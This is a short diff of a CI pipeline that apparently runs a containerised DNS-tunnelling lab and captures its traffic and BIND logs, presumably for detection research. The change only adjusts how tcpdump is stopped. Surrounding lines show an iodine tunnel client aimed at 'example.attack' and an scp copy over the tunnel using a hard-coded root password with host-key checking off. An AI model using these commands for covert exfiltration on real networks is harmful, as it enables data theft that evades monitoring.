@@ -33,7 +33,7 @@ jobs:
             #docker exec -d attack_client_1 iodine -4 -f -P abc123 -Tsrv -Oraw -r 172.18.0.4 example.attack
             docker exec -it attack_client_1 sshpass -p 'root' scp -r -oStrictHostKeyChecking=no root@10.0.0.1:test-file /tmp/
             docker exec -it dns_server_1 mv /var/bind/query.log /tmp/bind/iodine-bind9-<< parameters.dnstype >>-<< parameters.encoding >>-query.log
-            kill -2 $(ps aux | grep 'tcpdump' | head -n1 | awk '{print $2}')
+            kill $(ps aux | grep 'tcpdump' | head -n1 | awk '{print $2}') || true
             docker exec -it dns_server_1 mv /var/bind/pcap_* /tmp/bind/
             sudo chmod -R +rw $LOG_DIR/*
 
